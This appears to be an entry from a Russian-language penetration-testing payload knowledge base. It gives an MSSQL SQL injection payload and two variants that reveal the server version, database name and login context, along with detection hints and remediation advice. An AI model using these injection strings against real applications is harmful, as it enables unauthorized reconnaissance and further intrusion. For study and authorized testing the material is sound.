---
id: sqli-mssql-version-banner
title: "MSSQL: раскрытие версии через @@version"
type: sqli
target: mssql
category: web
difficulty: beginner
bypass: none
tags: [sqli, mssql, recon]
tested_on: ["SQL Server 2019"]
success_rate: 0.85
risk: low
cwe: "CWE-200"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# MSSQL: раскрытие версии через @@version

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' UNION SELECT @@version, DB_NAME(), SUSER_SNAME() --
```

## Explanation

`@@version` возвращает версию и сборку SQL Server, `DB_NAME()` — текущую БД,
`SUSER_SNAME()` — контекст безопасности (часто `sa` в плохо сконфигурированных приложениях).
В MSSQL строки конкатенируются через `+`, комментарий — `--` или `/* */`.
Версия определяет дальнейший вектор (наличие `xp_cmdshell`, `OPENROWSET`).

## Detection

Признаки MSSQL: ошибки `Unclosed quotation mark`, `Conversion failed when converting`,
синтаксис `TOP (1)`, `sysobjects`.

## Remediation

- Параметризованные запросы (SqlParameter).
- Приложение под учёткой без `sysadmin`.
- Скрытие детальных ошибок (customErrors / TRY-CATCH с общим ответом).

## Variants

```
'; SELECT @@version --
```

```
' AND 1=CONVERT(int,@@version) --
```
